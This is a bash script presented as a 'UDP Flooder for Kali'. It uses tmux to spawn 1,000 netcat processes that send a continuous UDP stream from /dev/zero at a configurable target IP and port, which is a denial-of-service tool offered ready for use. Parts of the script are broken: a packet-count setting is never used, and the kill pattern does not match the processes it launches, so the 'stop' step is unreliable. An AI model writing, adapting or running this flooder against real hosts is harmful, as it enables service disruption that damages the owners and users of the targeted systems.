#!/bin/bash

# Specify the target IP address and port
TARGET_IP="127.0.0.1"
TARGET_PORT="80"

# Specify the number of concurrent connections to use
NUM_CONNECTIONS="1000"

# Specify the number of packets to send per connection
NUM_PACKETS="10000"

# Set up the terminal multiplexer (e.g., 'tmux' or 'screen')
TMUX="tmux"

# Check if required tools are installed
command -v nc >/dev/null 2>&1 || { echo >&2 "Netcat (nc) is not installed. Please install it with 'sudo apt install netcat-openbsd'. Aborting."; exit 1; }
command -v $TMUX >/dev/null 2>&1 || { echo >&2 "$TMUX is not installed. Please install it with 'sudo apt install tmux'. Aborting."; exit 1; }

# Display welcome message and information about the tool
clear
echo "-----------------------------"
echo "|  UDP Flooder for Kali     |"
echo "-----------------------------"
echo "Target IP: $TARGET_IP"
echo "Target Port: $TARGET_PORT"
echo "Concurrent Connections: $NUM_CONNECTIONS"
echo "Packets per Connection: $NUM_PACKETS"
echo "Press 'q' to stop flooding."
echo "-----------------------------"

# Display tool information and options
PS3="Select an option: "
options=("Start Flooding" "Monitor Flooding" "Quit")

select opt in "${options[@]}"; do
    case $opt in
        "Start Flooding")
            clear
            echo "Starting UDP flooding..."
            # Start a new session in the terminal multiplexer
            $TMUX new-session -d -s udp-flood

            # Loop through the number of concurrent connections
            for i in $(seq 1 $NUM_CONNECTIONS); do
                # Use 'nc' to create a UDP flood to the target IP address and port
                $TMUX send-keys -t udp-flood:0 "nc -u -w1 $TARGET_IP $TARGET_PORT < /dev/zero &" C-m
            done

            # Set up the terminal multiplexer to kill all sessions when you press 'q'
            $TMUX send-keys -t udp-flood:0 "read -n 1 -s -r -p 'Press q to stop flooding...' && pkill -f 'nc -u $TARGET_IP $TARGET_PORT'" C-m

            echo "Flooding started. Press 'q' to stop."
            ;;
        "Monitor Flooding")
            # Attach to the session for real-time monitoring
            clear
            echo "Monitoring UDP flooding in real-time. Press 'q' to exit."
            $TMUX attach-session -t udp-flood
            ;;
        "Quit")
            echo "Quitting..."
            exit 0
            ;;
        *)
            echo "Invalid option. Please select again."
            ;;
    esac
done
